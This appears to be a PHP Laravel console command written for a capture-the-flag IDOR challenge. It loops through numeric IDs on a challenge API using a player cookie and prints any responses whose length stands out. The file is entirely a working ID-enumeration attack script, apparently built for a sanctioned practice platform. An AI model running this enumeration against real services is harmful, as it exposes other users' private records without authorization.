<?php

namespace App\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;

class CtfEnumerate extends Command
{
    protected $signature = 'ctf:enumerate
        {endpoint : API endpoint to enumerate (e.g. /api/notes)}
        {--method=GET : HTTP method}
        {--param=id : Parameter name for the ID}
        {--from=1 : Start ID}
        {--to=200 : End ID}
        {--body= : JSON body template with {ID} placeholder}
        {--header= : Extra header as key:value}';

    protected $description = 'Enumerate IDs on an endpoint and find anomalous responses (Challenge #7 IDOR)';

    public function handle()
    {
        $base = config('ctf.base_url');
        $cookie = config('ctf.resume_code');
        $endpoint = $this->argument('endpoint');
        $method = strtoupper($this->option('method'));
        $param = $this->option('param');
        $from = (int) $this->option('from');
        $to = (int) $this->option('to');
        $bodyTemplate = $this->option('body');
        $extraHeader = $this->option('header');

        $headers = [];
        if ($extraHeader) {
            [$key, $val] = explode(':', $extraHeader, 2);
            $headers[trim($key)] = trim($val);
        }

        $this->info("Enumerating {$endpoint} IDs {$from}-{$to} ({$method})");
        $bar = $this->output->createProgressBar($to - $from + 1);

        $responses = [];

        for ($i = $from; $i <= $to; $i++) {
            $http = Http::withCookies(['helix_player' => $cookie], 'challenge.qadna.co')
                ->withHeaders($headers);

            if ($bodyTemplate) {
                $body = json_decode(str_replace('{ID}', $i, $bodyTemplate), true);
                $resp = $http->send($method, "{$base}{$endpoint}", ['json' => $body]);
            } elseif ($method === 'GET') {
                $resp = $http->get("{$base}{$endpoint}", [$param => $i]);
            } else {
                $resp = $http->send($method, "{$base}{$endpoint}", [
                    'json' => [$param => $i],
                ]);
            }

            $len = strlen($resp->body());
            $status = $resp->status();
            $responses[$i] = ['status' => $status, 'length' => $len, 'body' => $resp->body()];
            $bar->advance();
        }

        $bar->finish();
        $this->newLine(2);

        // Find the most common length
        $lengths = array_column($responses, 'length');
        $counts = array_count_values($lengths);
        arsort($counts);
        $commonLength = array_key_first($counts);

        $this->info("Most common response length: {$commonLength} ({$counts[$commonLength]} responses)");
        $this->newLine();

        // Show anomalies
        $anomalies = [];
        foreach ($responses as $id => $resp) {
            if ($resp['length'] !== $commonLength) {
                $anomalies[$id] = $resp;
            }
        }

        if (empty($anomalies)) {
            $this->warn('No anomalies found — all responses have the same length.');
        } else {
            $this->info(count($anomalies) . ' anomalous response(s) found:');
            foreach ($anomalies as $id => $resp) {
                $this->newLine();
                $this->line("ID {$id} — status: {$resp['status']}, length: {$resp['length']}");
                $this->line($resp['body']);
            }
        }
    }
}
